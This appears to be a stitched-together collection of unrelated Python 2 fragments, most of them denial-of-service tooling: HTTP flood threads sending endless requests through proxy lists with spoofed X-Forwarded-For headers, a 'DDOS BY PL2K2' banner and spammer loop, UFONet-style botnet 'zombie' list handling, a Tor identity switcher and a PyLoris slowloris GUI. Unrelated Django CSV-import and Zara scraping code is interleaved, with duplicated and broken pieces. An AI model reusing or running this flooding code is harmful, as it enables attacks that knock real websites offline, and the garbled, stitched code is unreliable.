    return kilos.replace('.', '').replace(',', '.')

def transformarNetos(netos):
    return netos.replace('.', '')

def transformarPrecios(netos):
    return netos.replace('CLP', '').replace('.', '')

def transformarPorcentajes(porcentajes):
    return porcentajes.replace('%', '').replace(',', '.')						
  
class attacco(threading.Thread):
    def run(self):
        referer_list()
        current = x						
        
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        #referer   = "Referer: "+ randomReFerer() + randomKeyWord() + url + "?r="+ str(random.randint(10000, 100000)) +  "\r\n"
        #referer   = "Referer: "+ randomReFerer() + randomKeyWord() + "\r\n"
        referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(10000, 150000)) +  "\r\n"
        #referer   = "Referer: "+ host_url + "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
        while nload:
            time.sleep(1)
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(3):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')
								
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def httpcall(url):
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner = "&"
	else:
		param_joiner = "?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', getUserAgent())
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + host + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)

	index = random.randint(0,len(listaproxy)-1)
	proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
	opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
	urllib2.install_opener(opener)	
	try:
			urllib2.urlopen(request)
			if(flag==1): set_flag(0)
			if(code==500): code=0
	except urllib2.HTTPError, e:
			set_flag(1)
			code=500
			time.sleep(60)
	except urllib2.URLError, e:
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)

class Computer():
    def __init__(self, parent):
        Thread.__init__(self)
        self.power_on = False
        self.parent = parent
        self.tmp_dir = parent.tmp_dir
        self.target_dir = parent.target_dir

    def find_meat(self):
        self.meats = []
        try:
            for f in os.listdir(self.tmp_dir + "blackhole"):
                if f[-3:] == '.gz':
                    print "[Computer] Found meat in "+str(f)
                    self.meats.append(f)
        except:
            print "[Computer] No meat in the fridge "+self.tmp_dir + "blackhole"
            traceback.print_exc()
        return self.meats != []

    def process( self ):
        zombies_incoming=[]
        aliens_incoming=[]
        droids_incoming=[]
        ucavs_incoming=[]
        for meat in self.meats:
            f_in = gzip.open(self.tmp_dir+"blackhole/"+meat)
            if 'community_zombies.txt.gz' in f_in: # zombies found
                f_out = open(self.tmp_dir+'meat.txt', 'wb')
                for line in f_in.readlines(): 
                    zombies_incoming.append(line)
                    f_out.write(line.strip()+os.linesep)
                f_out.close()
            elif 'community_aliens.txt.gz' in f_in: # aliens found
                f_out = open(self.tmp_dir+'larva.txt', 'wb')
                for line in f_in.readlines(): 
                    aliens_incoming.append(line)
                    f_out.write(line.strip()+os.linesep)
                f_out.close()
            elif 'community_droids.txt.gz' in f_in: # droids found
                f_out = open(self.tmp_dir+'chip.txt', 'wb')
                for line in f_in.readlines(): 
                    droids_incoming.append(line)
                    f_out.write(line.strip()+os.linesep)
                f_out.close()
            elif 'community_ucavs.txt.gz' in f_in: # ucavs found
                f_out = open(self.tmp_dir+'arduino.txt', 'wb')
                for line in f_in.readlines(): 
                    ucavs_incoming.append(line)
                    f_out.write(line.strip()+os.linesep)
                f_out.close()
            f_in.close()
            os.remove(self.tmp_dir+"blackhole/"+meat)
        import subprocess
        f_tmp = open(self.tmp_dir + 'meat.tmp','wb')
        subprocess.call('../ufonet --force-yes -t "'+self.tmp_dir+'meat.txt"', shell=True, stdout=f_tmp) # testing zombies (GET)
        f_tmp.close()
        f_tmp = open(self.tmp_dir + 'meat.tmp')
        testoutput=f_tmp.read()
        f_tmp.close()
        if "Not any zombie active" in testoutput:
            if not aliens_incoming and not droids_incoming and not ucavs_incoming: # not any valid zombie (GET or POST)
                print "[Computer] no valid zombies !"
                return
        else:
            f_tested = open(self.tmp_dir+'meat.txt')
            zombies_community = f_tested.readlines()
            f_tested.close()
            o_in = gzip.open(self.target_dir+'abductions.txt.gz', 'rb')
            zombies_army = o_in.readlines()
            initial = len(zombies_army)
            o_in.close()
            for zombie in zombies_community:
                if zombie.strip() not in zombies_army:
                    zombies_army.append(zombie)
                else:
                    pass
            fc = gzip.open(self.tmp_dir+'newzombies.txt.gz', 'wb')
            for zombie in zombies_army:
                fc.write(zombie.strip()+os.linesep)
            fc.close()
            shutil.move(self.tmp_dir+'newzombies.txt.gz', self.target_dir+'abductions.txt.gz')
            print "[Computer] Zombies tested : " +str(len(zombies_community)) + " / initial : " +str(initial) + " / final : " + str(len(zombies_army))
            f_tested = open(self.tmp_dir+'larva.txt')
            aliens_community = f_tested.readlines()
            f_tested.close()
            o_in = gzip.open(self.target_dir+'troops.txt.gz', 'rb')
            aliens_army = o_in.readlines()
            initial = len(aliens_army)
            o_in.close()
            for alien in aliens_community:
                if alien.strip() not in aliens_army:
                    aliens_army.append(alien)
                else:
                    pass
            fc = gzip.open(self.tmp_dir+'newaliens.txt.gz', 'wb')
            for alien in aliens_army:
                fc.write(alien.strip()+os.linesep)
            fc.close()
            shutil.move(self.tmp_dir+'newaliens.txt.gz', self.target_dir+'troops.txt.gz')
            print "[Computer] Aliens tested : " +str(len(aliens_community)) + " / initial : " +str(initial) + " / final : " + str(len(aliens_army))
            f_tested = open(self.tmp_dir+'chip.txt')
            droids_community = f_tested.readlines()
            f_tested.close()
            o_in = gzip.open(self.target_dir+'robots.txt.gz', 'rb')
            droids_army = o_in.readlines()
            initial = len(droids_army)
            o_in.close()
            for droid in droids_community:
                if droid.strip() not in droids_army:
                    droids_army.append(droid)
                else:
                    pass
            fc = gzip.open(self.tmp_dir+'newdroids.txt.gz', 'wb')
            for droid in droids_army:
                fc.write(droid.strip()+os.linesep)
            fc.close()
            shutil.move(self.tmp_dir+'newdroids.txt.gz', self.target_dir+'robots.txt.gz')
            print "[Computer] Droids tested : " +str(len(droids_community)) + " / initial : " +str(initial) + " / final : " + str(len(droids_army))
            f_tested = open(self.tmp_dir+'arduino.txt')
            ucavs_community = f_tested.readlines()
            f_tested.close()
            o_in = gzip.open(self.target_dir+'drones.txt.gz', 'rb')
            ucavs_army = o_in.readlines()
            initial = len(ucavs_army)
            o_in.close()
            for ucav in ucavs_community:
                if ucav.strip() not in ucavs_army:
                    ucavs_army.append(ucav)
                else:
                    pass
            fc = gzip.open(self.tmp_dir+'newucavs.txt.gz', 'wb')
            for ucav in ucavs_army:
                fc.write(ucav.strip()+os.linesep)
            fc.close()
            shutil.move(self.tmp_dir+'newucavs.txt.gz', self.target_dir+'drones.txt.gz')
            print "[Computer] Drones tested : " +str(len(ucavs_community)) + " / initial : " +str(initial) + " / final : " + str(len(ucavs_army))

    def run(self):
        self.power_on = True
        print "[Computer] Power On"
        while self.power_on :
            # load list of files to process
            if self.find_meat():
                # if data -> process
                self.process()
            time.sleep(5)
        print "[Computer] Power Off"

class BlackRay():
    def __init__(self, parent):
        Thread.__init__(self)
        self.parent = parent
        self.active = False
        self.sock = None
        self.shining = False

    def run( self ):
        conn = None
        addr = None
        self.sock = self.parent.try_bind(9991)
        if self.sock is not None:
            self.sock.listen(1)
            print '[BlackRay] Emitting on port 9991'
            self.shining = True
        else:
            print '[BlackRay ERROR] Failed to emit on port 9991'
        while self.shining:
            try:
                conn,addr = self.sock.accept()
                print '[BlackRay] Got connection from', addr
            except socket.timeout:
                pass
            except socket.error, e:
                if self.shining == False:
                    print "[BlackRay] Socket Error /return : "+str(e)
                    return
                else:
                    print "[BlackRay] Socket Error /break : "+str(e)
                    break
            else:
                data = conn.recv(1024)
                if data : 
                    if data[0:4] == "SEND" :
                        print "[BlackRay] Meat ready : "+data[5:]
                conn.close()
        print '[BlackRay] End of emission'
        self.sock.close()

class Eater():
    def __init__(self, client, parent):
        Thread.__init__(self)
        self.client = client
        self.parent = parent

    def run(self):
        print '[Eater] Yum... got meat'
        zombie_meat = "community_zombies.txt.gz"
        alien_meat = "community_aliens.txt.gz"
        droid_meat = "community_droids.txt.gz"
        ucav_meat = "community_ucavs.txt.gz"
        while 1:
            data = self.client.recv(1024)
            if not data:
                break
        if zombie_meat in data: # get zombies
            r = re.compile(".*("+zombie_meat+").*") # regex magics
            meat_type = r.search(data)
            m = meat_type.group(1)
            f = open(self.parent.tmp_dir+"blackhole/"+m,"wb")
            f.write(data)
            print '\n[Eater] Got "%s Closing media transfer"' % f.name
            f.close()
        elif alien_meat in data: # get aliens
            r = re.compile(".*("+alien_meat+").*") # regex magics
            meat_type = r.search(data)
            m = meat_type.group(1)
            f = open(self.parent.tmp_dir+"blackhole/"+m,"wb")
            f.write(data)
            print '\n[Eater] Got "%s Closing media transfer"' % f.name
            f.close()
        elif droid_meat in data: # get zombies
            r = re.compile(".*("+droid_meat+").*") # regex magics
            meat_type = r.search(data)
            m = meat_type.group(1)
            f = open(self.parent.tmp_dir+"blackhole/"+m,"wb")
            f.write(data)
            print '\n[Eater] Got "%s Closing media transfer"' % f.name
            f.close()
        elif ucav_meat in data: # get ucavs
            r = re.compile(".*("+ucav_meat+").*") # regex magics
            meat_type = r.search(data)
            m = meat_type.group(1)
            f = open(self.parent.tmp_dir+"blackhole/"+m,"wb")
            f.write(data)
            print '\n[Eater] Got "%s Closing media transfer"' % f.name
            f.close()
        self.client.close()
        self.parent.eater_full(self)
class Switcher(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = ".o0O| TOR Switcher |O0o.")

        self.host = StringVar()
        self.port = IntVar()
        self.passwd = StringVar()
        self.time = DoubleVar()

        self.host.set('localhost')
        self.port.set('9051')
        self.passwd.set('')
        self.time.set('30')

        Label(self, text = 'Host:').grid(row = 1, column = 1)
        Label(self, text = 'Port:').grid(row = 2, column = 1)
        Label(self, text = 'Password:').grid(row = 3, column = 1)
        Label(self, text = 'Interval:').grid(row = 4, column = 1)

        Entry(self, textvariable = self.host).grid(row = 1, column = 2, columnspan = 2)
        Entry(self, textvariable = self.port).grid(row = 2, column = 2, columnspan = 2)
        Entry(self, textvariable = self.passwd, show = '*').grid(row = 3, column = 2, columnspan = 2)
        Entry(self, textvariable = self.time).grid(row = 4, column = 2, columnspan = 2)

        Button(self, text = 'Start', command = self.start).grid(row = 5, column = 2)
        Button(self, text = 'Stop', command = self.stop).grid(row = 5, column = 3)

        self.output = Text(self, foreground="white", background="black", highlightcolor="white", highlightbackground="purple", wrap=WORD, height = 8, width = 40)
        self.output.grid(row = 1, column = 4, rowspan = 5)

    def start(self):
        self.write('TOR Switcher starting.')
        self.ident = random.random()
        thread.start_new_thread(self.newnym, ())

    def stop(self):
        try:
            self.write('TOR Switcher stopping.')
        except:
            pass
        self.ident = random.random()

    def write(self, message):
        t = time.localtime()
        try:
            self.output.insert(END, '[%02i:%02i:%02i] %s\n' % (t[3], t[4], t[3], message))
        except:
            print('[%02i:%02i:%02i] %s\n' % (t[3], t[4], t[3], message))
            
    def newnym(self):
        key = self.ident
        host = self.host.get()
        port = self.port.get()
        passwd = self.passwd.get()
        interval = self.time.get()

        try:
            tn = telnetlib.Telnet(host, port)
            if passwd == '':
                tn.write("AUTHENTICATE\r\n")
            else:
                tn.write("AUTHENTICATE \"%s\"\r\n" % (passwd))
            res = tn.read_until('250 OK', 5)

            if res.find('250 OK') > -1:
                self.write('AUTHENTICATE accepted.')
            else:
                self.write('Control responded "%s".')
                key = self.ident + 1
                self.write('Quitting.')
        except Exception, ex:
            self.write('There was an error: %s.' % (ex))
            key = self.ident + 1
            self.write('Quitting.')
        
        while key == self.ident:
            try:
                tn.write("signal NEWNYM\r\n")
                res = tn.read_until('250 OK', 5)
                if res.find('250 OK') > -1:
                    self.write('New identity established.')
                else:
                    self.write('Control responded "%s".')
                    key = self.ident + 1
                    self.write('Quitting.')
                time.sleep(interval)
            except Exception, ex:
                self.write('There was an error: %s.' % (ex))
                key = self.ident + 1
                self.write('Quitting.')

        try:
            tn.write("QUIT\r\n")
            tn.close()
        except:
            pass
			
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass
			
def randomIp():
    random.seed()
    result = str(random.randint(10000, 254000)) + '.' + str(random.randint(10000, 254000))
    result = result + str(random.randint(10000, 254)) + '.' + str(random.randint(10000, 254000))
    return result

def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(8, 10)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
def parse_item(self, response) :
        sel = Selector (response)
        items = []
        item = ZaraItem ()
        item['url'] = response.request.url
        title = sel.xpath ('//div[@class="right"]//header/h1//text()').extract()
        if title :
                item['title'] = title
        item['ref'] = sel.xpath ('//p[@class="reference"]//text()').extract()
        item['price'] = sel.xpath ('//p[@class="price"]/span[@class="price"]/@data-price').extract()
        desc = sel.xpath ('//p[@class="description"]/text()').extract()
        if desc :
                item['desc'] = desc
        item['img'] = sel.xpath ('//div[@class="imgCont"]//img/@src').extract()
        item['img_color'] = sel.xpath ('//span/i[@class="icon icon-arrow-down-color"]//text()').extract()
        if item['title'] and item['ref'] :
                return item						

def import_file(request, pk):
    mensaje = ''
    context = locals()
    if request.method == 'POST':
        try:
            file = request.FILES['archivo']
            dataReader = csv.DictReader(file, delimiter=';')
            if (pk=='1'):
                for x in dataReader:
                    modelo = EERR()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.kilo = transformarKilos(x['Kilos'])
                    modelo.venta = transformarPrecios(x['Venta'])
                    modelo.ingreso = transformarPrecios(x['Total Ingresos'])
                    modelo.gasto = transformarPrecios(x['Total Gastos'])
                    modelo.margen_peso = transformarPrecios(x['Margen'])
                    modelo.margen_porc = float(transformarPorcentajes(x['Margen %'])) / 100
                    modelo.save()
                    mensaje = 'El reporte Estado de Resultado, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 1)
            elif (pk=='2'):
                for x in dataReader:
                    modelo = Kilos()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.kilos = transformarKilos(x['Kilos Venta'])
                    modelo.save()
                    mensaje = 'El reporte Kilos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 2)
            elif (pk=='3'):
                for x in dataReader:
                    modelo = PrecioPromedio()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.sector_id = x['Sector']
                    modelo.kilo = transformarKilos(x['Kilos Venta'])
                    modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.save()
                    mensaje = 'El reporte Precio Promedio vs Zona, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 3)
            elif (pk=='4'):
                for x in dataReader:
                    modelo = Descuento()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.tipoCliente_id = x['Tipo de Cliente']
                    modelo.sector_id = x['Sector']
                    modelo.cadena_id = x['Cadena']
                    modelo.rut = x['Rut']
                    modelo.tipoPedido = x['Tipo Pedido']
                    if (x['Kilos  Facturados'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos  Facturados'])
                    if (x['P.Base'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.base = transformarKilosSinKG(x['P.Base'])
                    if (x['P.Especial'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.especial = transformarKilosSinKG(x['P.Especial'])
                    if (x['P.Vigente'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.vigente = transformarKilosSinKG(x['P.Vigente'])
                    if (x['P.Pedido'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.pedido = transformarKilosSinKG(x['P.Pedido'])
                    if (x['P.Facturado'] == 'X'):
                        modelo.kilo = 0
                    else:
                        modelo.facturado = transformarKilosSinKG(x['P.Facturado'])
                    modelo.save()
                    mensaje = 'El reporte Precios y Descuentos, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 4)
            elif (pk=='5'):
                for x in dataReader:
                    modelo = Gasto()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.clasecoste_id = x['Clase de coste']
                    if x['Monto'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.gasto = transformarPrecios(x['Monto'])
                    modelo.save()
                    mensaje = 'El reporte Costos Unitarios, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 5)
            elif (pk=='6'):
                for x in dataReader:
                    modelo = VentaCompleta()
                    modelo.oficina_id = x['Oficina de ventas']
                    modelo.periodo_id = request.POST['periodo']
                    modelo.sector_id = int(x['Sector'])
                    modelo.tipoCliente_id = x['Tipo de cliente']
                    modelo.cliente = x['Cod Local']
                    modelo.categoria_id = x['Categoria Cliente']
                    modelo.fecha = transformarFechas(x['Dia natural'])
                    modelo.supervisor = x['Supervisor_BP-CL']
                    modelo.preventa = x['Preventa_BP-CL']
                    if x['Unidades Venta'] == '':
                        modelo.unidad = 0
                    else:
                        modelo.unidad = transformarNetos(x['Unidades Venta'])
                    if x['Kilos Venta'] == '':
                        modelo.kilo = 0
                    else:
                        modelo.kilo = transformarKilosSinKG(x['Kilos Venta'])
                    if x['Venta Neta'] == '':
                        modelo.neto = 0
                    else:
                        modelo.neto = transformarNetos(x['Venta Neta'])
                    modelo.codigoMaterial = x['Cod Material']
                    modelo.material = x['Material']
                    modelo.nivel2 = x['Nivel 2']
                    modelo.nivel3 = x['Nivel 3']
                    modelo.marca = x['Marca']
                    modelo.referencia = x['Referencia']
                    modelo.save()
                    mensaje = 'El reporte Formula de Ingreso, ha sido cargado correctamente'
                save_report(request.user, request.POST['periodo'], 6)
            else:
                mensaje = 'Este importe no ha sido programado'
        except Exception, e:
            mensaje = 'Ha ocurrido un error interno, por favor vuelva a intentarlo: ' + str(e)
            print(str(e))
    return render(request, 'imports/success_import.html', {'mensaje': mensaje, 'context': context})

def data_exist_eerr(request, pk):
    consulta = EERR.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_pp_vs_zn(request, pk):
    consulta = PrecioPromedio.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_precio_desc(request, pk):
    consulta = Descuento.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_unit(request, pk):
    consulta = Gasto.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def data_exist_formula_ingreso(request, pk):
    consulta = VentaCompleta.objects.all().filter(periodo__id=pk)
    if consulta.count() == 0:
        retorno = 0
    else:
        retorno = 1
    json_data = json.dumps({'retorno': retorno})
    return HttpResponse(json_data, content_type='application/json; charset=utf8')

def transformarKilos(kilos):
    return kilos.replace('KG', '').replace('.', '').replace(',', '.')

def transformarKilosSinKG(kilos):
    return kilos.replace('.', '').replace(',', '.')

def transformarNetos(netos):
    return netos.replace('.', '')

def transformarPrecios(netos):
    return netos.replace('CLP', '').replace('.', '')

def transformarPorcentajes(porcentajes):
    return porcentajes.replace('%', '').replace(',', '.')						
 	
class attacco(threading.Thread):
    def run(self):
    	referer_list()
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        referer   = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 1500)) +  "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"

        while nload:
        	time.sleep(1)
        	pass
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(4):
                        a.send(httprequest)
                except:
                    tts = 1
 
                   
            except:
                proxy = random.choice(listaproxy).split(':')

print \
"""
                           `                        
                          `.`                       
                        `....`     `                
         ``````    `   ``.....`    `    ``````      
           `...    .`   `....`    ..   `...`        
            `..````...``.......`....```..`          
             `..........................`           
              `........................`            
               ```..................````            
            ``.....``````.....`````.....``          
         ``..............````..............``       
      ```.....................................``    
     ````..........:oddo/-..-/sddo:..........`````  
    ``...........-sNMMMMNmhhmMMMMMNs-...........``  
  `..............odMMMMMMMMMMMMMMMMdo..............`
  ...............:shNMMMMMMMMMMMMNho:...............
  .............-/s/.:+hMNNMMNNMy+:./s/-.............
  ............+mMMm+--.ssNMMNss.--odMMm+............
  ............:hNMNNmd-sNMMMMNs-dmNNMNh:............
  `............./sdmNMsmMMMMMMdsMNmds/.............`
   ...............omMmmmMMMMMMmmNMmo............... 
    ..```.........hMMds++ohho++smMMh.........` `..  
     `  `.........ydNMMNh+..+hNMMNdy.........`  `   
        `.........shhmMNho-.ohNMmdhy.........`      
        `.........../oo//shyo//oo:...........`      
         ``...........:dmNMMNmd.............`       
           ``..........o+mNNd:+...........`         
             ````.........::.........``.`           
                 ....................`              
                 `..................`   #~~> I am PL2K2 <~~#    
                   ``.............`     #~~> DDOS BY PL2K2 <~~# 
                     ``.........`                   
                       ``.....`                     
                         ````         
"""
if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: Mod By PL2K2 :::::........')
    os.system('color 0c')
Close = False
Lock = threading.Lock()
Request = 999999999999999999999
Tot_req = 9999999999
Port = 80
class Spammer(threading.Thread):

    def __init__(self, url, number):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number

    def run(self):
        global Lock
        global Tot_req
        global Close
        global Request
        Lock.acquire()
        print 'Thread {0} started!'.format(self.num)
        Lock.release()
        while Close == False:
            try:
                urllib.urlopen(self.url)
                Request += 999999999999999999999
                Tot_req += 9
                Port = 80
            except:
                pass

        Lock.acquire()
        print 'Closing thread #{0} started!'.format(self.num)
        Lock.release()
        sys.exit(0)
class extended_thread(Thread):
    PORT = None
    HOST = ''
    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((self.HOST, self.PORT))
            s.listen(1)
            s.settimeout(120)
            conn, addr = s.accept()
            print 'Connected by', addr
            while 1:
                data = conn.recv(1024)
                if not data: break
                conn.sendall(data)
            conn.close()
            server_welcome.socket_success.append(self.PORT)
        except socket.timeout as msg:
            s.close()
            s = None
            print "Socket " + str(self.PORT) + " timed out after two minutes."
            server_welcome.local_socket_exceptions.append(self.PORT)
        except socket.error as msg:
            s.close()
            s = None
            server_welcome.local_socket_exceptions.append(self.PORT)

class Switcher(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = ".o0O| TOR Switcher |O0o.")

        self.host = StringVar()
        self.port = IntVar()
        self.passwd = StringVar()
        self.time = DoubleVar()

        self.host.set('localhost')
        self.port.set('9051')
        self.passwd.set('')
        self.time.set('30')

        Label(self, text = 'Host:').grid(row = 1, column = 1)
        Label(self, text = 'Port:').grid(row = 2, column = 1)
        Label(self, text = 'Password:').grid(row = 3, column = 1)
        Label(self, text = 'Interval:').grid(row = 4, column = 1)

        Entry(self, textvariable = self.host).grid(row = 1, column = 2, columnspan = 2)
        Entry(self, textvariable = self.port).grid(row = 2, column = 2, columnspan = 2)
        Entry(self, textvariable = self.passwd, show = '*').grid(row = 3, column = 2, columnspan = 2)
        Entry(self, textvariable = self.time).grid(row = 4, column = 2, columnspan = 2)

        Button(self, text = 'Start', command = self.start).grid(row = 5, column = 2)
        Button(self, text = 'Stop', command = self.stop).grid(row = 5, column = 3)

        self.output = Text(self, foreground="white", background="black", highlightcolor="white", highlightbackground="purple", wrap=WORD, height = 8, width = 40)
        self.output.grid(row = 1, column = 4, rowspan = 5)

    def start(self):
        self.write('TOR Switcher starting.')
        self.ident = random.random()
        thread.start_new_thread(self.newnym, ())

    def stop(self):
        try:
            self.write('TOR Switcher stopping.')
        except:
            pass
        self.ident = random.random()

    def write(self, message):
        t = time.localtime()
        try:
            self.output.insert(END, '[%02i:%02i:%02i] %s\n' % (t[3], t[4], t[3], message))
        except:
            print('[%02i:%02i:%02i] %s\n' % (t[3], t[4], t[3], message))
            
    def newnym(self):
        key = self.ident
        host = self.host.get()
        port = self.port.get()
        passwd = self.passwd.get()
        interval = self.time.get()

        try:
            tn = telnetlib.Telnet(host, port)
            if passwd == '':
                tn.write("AUTHENTICATE\r\n")
            else:
                tn.write("AUTHENTICATE \"%s\"\r\n" % (passwd))
            res = tn.read_until('250 OK', 5)

            if res.find('250 OK') > -1:
                self.write('AUTHENTICATE accepted.')
            else:
                self.write('Control responded "%s".')
                key = self.ident + 1
                self.write('Quitting.')
        except Exception, ex:
            self.write('There was an error: %s.' % (ex))
            key = self.ident + 1
            self.write('Quitting.')
        
        while key == self.ident:
            try:
                tn.write("signal NEWNYM\r\n")
                res = tn.read_until('250 OK', 5)
                if res.find('250 OK') > -1:
                    self.write('New identity established.')
                else:
                    self.write('Control responded "%s".')
                    key = self.ident + 1
                    self.write('Quitting.')
                time.sleep(interval)
            except Exception, ex:
                self.write('There was an error: %s.' % (ex))
                key = self.ident + 1
                self.write('Quitting.')

        try:
            tn.write("QUIT\r\n")
            tn.close()
        except:
            pass
            
class MainWindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = ".o0O| PyLoris |O0o.")
        self.lws = []

        self.options = {
            'host' : StringVar(),
            'port' : IntVar(),
            'ssl' : BooleanVar(),
            'attacklimit' : IntVar(),
            'connectionlimit' : IntVar(),
            'threadlimit' : IntVar(),
            'connectionspeed' : DoubleVar(),
            'timebetweenthreads' : DoubleVar(),
            'timebetweenconnections' : DoubleVar(),
            'quitimmediately' : BooleanVar(),
            'socksversion' : StringVar(),
            'sockshost' : StringVar(),
            'socksport' : IntVar(),
            'socksuser' : StringVar(),
            'sockspass' : StringVar(),
            'request' : StringVar(),
        }

        self.options['host'].set('localhost')
        self.options['port'].set(80)
        self.options['ssl'].set(False)
        self.options['attacklimit'].set(500)
        self.options['connectionlimit'].set(500)
        self.options['threadlimit'].set(50)
        self.options['connectionspeed'].set(0.3)
        self.options['timebetweenthreads'].set(0.3)
        self.options['timebetweenconnections'].set(1)
        self.options['quitimmediately'].set(False)
        self.options['socksversion'].set('NONE')
        self.options['sockshost'].set('localhost')
        self.options['socksport'].set(9050)
        self.options['socksuser'].set('')
        self.options['sockspass'].set('')

        gf = LabelFrame(self, text = 'General', relief = GROOVE, labelanchor = 'nw', width = 400, height = 90)
        gf.grid(row = 0, column = 1)
        gf.grid_propagate(0)
        Label(gf, text = 'Host:').grid(row = 0, column = 1)
        Entry(gf, textvariable = self.options['host']).grid(row = 0, column = 2, columnspan = 2)
        Label(gf, text = 'Port:').grid(row = 1, column = 1)
        Entry(gf, textvariable = self.options['port']).grid(row = 1, column = 2, columnspan = 2)
        Checkbutton(gf, text = 'SSL', variable = self.options['ssl']).grid(row = 2, column = 1)

        bf = LabelFrame(self, text = 'Behavior', relief = GROOVE, labelanchor = 'nw', width = 400, height = 170)
        bf.grid(row = 1, column = 1)
        bf.grid_propagate(0)
        Label(bf, text = 'Attack Limit (0 = No limit):').grid(row = 0, column = 1)
        Entry(bf, textvariable = self.options['attacklimit']).grid(row = 0, column = 2)
        Label(bf, text = 'Connection Limit (0 = No limit):').grid(row = 1, column = 1)
        Entry(bf, textvariable = self.options['connectionlimit']).grid(row = 1, column = 2)
        Label(bf, text = 'Thread Limit (0 = No limit):').grid(row = 2, column = 1)
        Entry(bf, textvariable = self.options['threadlimit']).grid(row = 2, column = 2)
        Label(bf, text = 'Connection speed (bytes/sec):').grid(row = 3, column = 1)
        Entry(bf, textvariable = self.options['connectionspeed']).grid(row = 3, column = 2)
        Label(bf, text = 'Time between thread spawns (seconds):').grid(row = 4, column = 1)
        Entry(bf, textvariable = self.options['timebetweenthreads']).grid(row = 4, column = 2)
        Label(bf, text = 'Time between connections (seconds):').grid(row = 5, column = 1)
        Entry(bf, textvariable = self.options['timebetweenconnections']).grid(row = 5, column = 2)
        Checkbutton(bf, text = 'Close finished connections', variable = self.options['quitimmediately']).grid(row = 6, column = 1, columnspan = 2)

        pf = LabelFrame(self, text = 'Proxy', relief = GROOVE, labelanchor = 'nw', width = 400, height = 130)
        pf.grid(row = 2, column = 1)
        pf.grid_propagate(0)
